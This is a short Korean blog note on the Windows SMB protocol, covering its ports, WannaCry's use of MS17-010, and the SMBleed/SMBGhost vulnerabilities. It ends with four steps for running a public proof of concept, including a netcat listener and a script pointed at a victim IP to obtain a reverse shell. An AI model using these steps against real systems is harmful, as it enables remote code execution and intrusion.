---
title: SMB
date: 2023-05-01 00:53:00 +0900
categories: [Windows]
tags: [Windows] 
---

**SMB란**
포트번호 : 137(UDP), 138(UDP), 139(TCP), 445(TCP)
적용 대상 : Windows Server 2008 ~
SMB(Servr Message Block)
2017년도 SMB 원격코드실행 취약점(MS17-010)을 악용한 랜섬웨어 : WannaCry
CVE-2020-1206, SMBleed. SMBGhost오 연계적으로 익스플로잇 됐을 때 원격 코드 실행 공격을 허용. SMBGhost는 CVE-2020-0796
SMBleed, SMBGhost는 모두 SMB3.1.1버전의 압축 원리에서 발생(SMB가 특정 요청을 처리할 때 발동)
SMBleed : win10, winser2004 모두 발견됐으나 패치 완료. 다만 SMB v3 압축 기능 비활성화 하면 위험도가 낮아질 수 있음 


**SMBleed**
POC : https://github.com/ZecOps/CVE-2020-0796-RCE-POC
1. calc_target_offsets.bat 실행하여 대상 Windows 버전의 오프셋 결정
2. 기본 오프셋을 bat의 출력으로 바꿔 SMBleedingGhost.py 수정
3. netcat 실행 :: nc -lvnp [attacker_port]
4. SMBleedingGhost.py [victim_ip] [attacker_ip] [attacker_port]

